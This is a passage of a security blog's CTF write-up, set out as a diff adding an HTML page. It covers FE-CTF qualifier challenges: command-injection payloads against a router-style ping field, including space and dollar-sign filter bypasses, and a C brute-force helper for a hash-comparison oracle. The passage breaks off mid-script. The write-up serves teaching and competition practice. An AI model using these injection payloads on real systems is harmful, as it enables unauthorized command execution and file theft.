@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.92.2" />
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="" />
+  <meta property="og:url" content="http://cavefxa.com/posts/fe-ctf/" />
+  <link rel="canonical" href="http://cavefxa.com/posts/fe-ctf/" /><link rel="alternate" type="application/atom+xml" href="http://cavefxa.com/index.xml" title="cavefxa: security research">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "http:\/\/cavefxa.com\/"
+      },
+      "articleSection" : "posts",
+      "name" : "FE-CTF (HackingFromEstonia): Finals and Quals Writeups",
+      "headline" : "FE-CTF (HackingFromEstonia): Finals and Quals Writeups",
+      "description" : "Qualifiers - Dig1 A lot of older routers, have this thing in settings that allows your to ping routers. This input is usually just smacked directly into bash, and then executed. Knowing this, we can try command injection with something as simple as:\n127.0.0.1; cat \/flag flag{do people still use php?}\nQualifiers - Dig2 This is the same type of challenge, except now we don\u0026rsquo;t have spaces. Googling this issue: https:\/\/unix.",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2022",
+      "datePublished": "2022-11-28 21:49:35 \u002b0100 CET",
+      "dateModified" : "2022-11-28 21:49:35 \u002b0100 CET",
+      "url" : "http:\/\/cavefxa.com\/posts\/fe-ctf\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>FE-CTF (HackingFromEstonia): Finals and Quals Writeups</title>
+  <meta property="og:title" content="FE-CTF (HackingFromEstonia): Finals and Quals Writeups" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="Qualifiers - Dig1 A lot of older routers, have this thing in settings that allows your to ping routers. This input is usually just smacked directly into bash, and then executed. Knowing this, we can try command injection with something as simple as:
+127.0.0.1; cat /flag flag{do people still use php?}
+Qualifiers - Dig2 This is the same type of challenge, except now we don&amp;rsquo;t have spaces. Googling this issue: https://unix." />
+  <meta name="description" content="Qualifiers - Dig1 A lot of older routers, have this thing in settings that allows your to ping routers. This input is usually just smacked directly into bash, and then executed. Knowing this, we can try command injection with something as simple as:
+127.0.0.1; cat /flag flag{do people still use php?}
+Qualifiers - Dig2 This is the same type of challenge, except now we don&amp;rsquo;t have spaces. Googling this issue: https://unix." />
+  <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
+  
+
+  
+    <style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:900px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="cavefxa: security research">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post " id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >cavefxa</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="/about" target="_blank">About Me</a>
+  </div>
+  
+</div>
+<div class="row end-xs">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">FE-CTF (HackingFromEstonia): Finals and Quals Writeups</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2022-11-28 21:49:35 CET">
+                28 Nov 2022
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h1 id="qualifiers---dig1">Qualifiers - Dig1</h1>
+<p>A lot of older routers, have this thing in settings that allows your to ping routers. This input is
+usually just smacked directly into bash, and then executed. Knowing this, we can try command injection
+with something as simple as:</p>
+<pre tabindex="0"><code>127.0.0.1; cat /flag
+</code></pre><p><code>flag{do people still use php?}</code></p>
+<h1 id="qualifiers---dig2">Qualifiers - Dig2</h1>
+<p>This is the same type of challenge, except now we don&rsquo;t have spaces. Googling this issue:
+<a href="https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces">https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces</a></p>
+<p>Gives us a payload we can try</p>
+<pre tabindex="0"><code>127.0.0.1;cat${IFS}/flag
+</code></pre><p><code>flag{who needs to sanitize input anyway?}</code></p>
+<h1 id="qualifiers---dig3">Qualifiers - Dig3</h1>
+<p>For the last one we cannot use dollar signs, so we try something else:</p>
+<pre tabindex="0"><code>127.0.0.1;cat&lt;flag
+</code></pre><p><code>flag{it's not bug, it's a feature}</code></p>
+<h1 id="qualifiers---hash-uppers-downers">Qualifiers - Hash Uppers Downers</h1>
+<p>I solved this challenge after the CTF with my friend Mikbrosim.
+We knew what to do, during the CTF - but we were playing from an airport, so we didn&rsquo;t have a lot of time.</p>
+<p>We&rsquo;re given some source code, and a remote. Now upon sending a password to the remote, we&rsquo;re told
+whether or not the value we sent, hashed, is less than the hash of the password stored on the server.</p>
+<p>The charset of the password is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> ALPHABET[] <span style="color:#f92672">=</span>
+            <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
+            <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>
+            <span style="color:#e6db74">&#34;0123456789&#34;</span>;
+</code></pre></div><p>This is 62 different characters. We know that there&rsquo;s atleast 5 characters in the password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">assert(strlen(PASSWORD) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">5</span>);
+</code></pre></div><p>Assuming that the password is 5 characters then there&rsquo;s <code>63**5</code> or <code>916136543</code> possible combinations. This is approximately
+3.7 bytes, <code>log256(916136543)=3.7</code>.</p>
+<p>Now we need to figure out how we bruteforce this. The server sleeps one second each try, so bruteforcing 3.7 bytes would take
+about the same time as an orbital period of Saturn, 5.5 times the half life of Cobalt-60 or 10603 days. Not very feasible.</p>
+<p>Now if we assume we could cut our guesses in half with every guess, we would have <code>log2(992436543)=29.9</code>. This is some rough
+math that doesn&rsquo;t take a lot of things into consideration, but this should be do able. Of course we still need to check a lot of
+things locally, but we should only need to send around 30 requests to the server. But how can we cut our guesses in half with
+every guess? Well, we&rsquo;re told everytime we send a password, if the hash is larger or smaller. This should make one think of
+binary search. So we implement this in the C script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;sha1.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// main(salt);
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]){
+    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>){
+        printf(<span style="color:#e6db74">&#34;Usage: Salt!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+    } 
+
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> ALPHABET[] <span style="color:#f92672">=</span>
+                <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
+                <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>
+                <span style="color:#e6db74">&#34;0123456789&#34;</span>;
+
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> salt[<span style="color:#ae81ff">16</span>];
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> userhash[SHA1_DIGEST_SIZE];
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> lowerhash[SHA1_DIGEST_SIZE] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</span><span style="color:#e6db74">&#34;</span>;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> upperhash[SHA1_DIGEST_SIZE] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff</span><span style="color:#e6db74">&#34;</span>;
+   
+    memcpy(salt, argv[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>);
+
+    <span style="color:#66d9ef">int</span> N <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(ALPHABET);
+    <span style="color:#66d9ef">char</span> guess[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+    
+    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> x<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; x<span style="color:#f92672">&lt;</span>N; x<span style="color:#f92672">++</span>){
+        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> y<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; y<span style="color:#f92672">&lt;</span>N; y<span style="color:#f92672">++</span>){
+            <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> z<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; z<span style="color:#f92672">&lt;</span>N; z<span style="color:#f92672">++</span>){
+                <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>N; i<span style="color:#f92672">++</span>){
+                    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; j<span style="color:#f92672">&lt;</span>N; j<span style="color:#f92672">++</span>){
+                        guess[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> ALPHABET[x];
+                        guess[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> ALPHABET[y];
+                        guess[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> ALPHABET[z];
+                        guess[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> ALPHABET[i];
+                        guess[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> ALPHABET[j];
+                         
+                        SHA1_CTX ctx;
+                        SHA1_Init(<span style="color:#f92672">&amp;</span>ctx);
+                        SHA1_Update(<span style="color:#f92672">&amp;</span>ctx, salt, strlen(salt));
+                        SHA1_Update(<span style="color:#f92672">&amp;</span>ctx, guess, strlen(guess));
+                        SHA1_Final(<span style="color:#f92672">&amp;</span>ctx, userhash);
+                        
+                        <span style="color:#66d9ef">int</span> lower_bound <span style="color:#f92672">=</span> memcmp(lowerhash, userhash, <span style="color:#66d9ef">sizeof</span>(userhash));
+                        <span style="color:#66d9ef">int</span> upper_bound <span style="color:#f92672">=</span> memcmp(upperhash, userhash, <span style="color:#66d9ef">sizeof</span>(userhash));
+
+                        <span style="color:#75715e">// input is larger than lower bound
+</span><span style="color:#75715e"></span>                        <span style="color:#75715e">// and smaller than upper bound 
+</span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">if</span> (lower_bound <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> upper_bound <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>){
+                            printf(<span style="color:#e6db74">&#34;Try sending %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, guess);
+                        
+                            <span style="color:#66d9ef">int</span> server_result <span style="color:#f92672">=</span> getc(stdin);
+                            getc(stdin);
+
+                            <span style="color:#66d9ef">if</span> (server_result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&lt;&#39;</span>){
+                                memcpy(lowerhash, userhash, SHA1_DIGEST_SIZE);
+                                lowerhash[SHA1_DIGEST_SIZE] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+                            } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (server_result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&gt;&#39;</span>){
+                                memcpy(upperhash, userhash, SHA1_DIGEST_SIZE);
+                                upperhash[SHA1_DIGEST_SIZE] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
